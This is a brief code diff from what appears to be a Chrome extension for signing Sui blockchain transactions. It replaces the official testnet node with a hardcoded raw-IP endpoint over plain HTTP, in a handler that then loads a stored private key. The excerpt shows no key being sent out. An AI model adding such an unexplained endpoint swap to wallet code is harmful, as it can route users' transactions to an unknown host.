@@ -18,7 +18,8 @@ chrome.runtime.onInstalled.addListener(async () => {
 
 chrome.runtime.onMessage.addListener(async (message, sender, sendResponse) => {
   if (message.action === "executeTransaction") {
-    const client = new SuiClient({ url: getFullnodeUrl("testnet") })
+    // const client = new SuiClient({ url: getFullnodeUrl("testnet") })
+    const client = new SuiClient({ url: "http://47.76.89.7:9001/" })
     const transactionBytes = message.transactionBytes
     const txb = TransactionBlock.from(transactionBytes)
     const privateKey = await storage.get("secret")
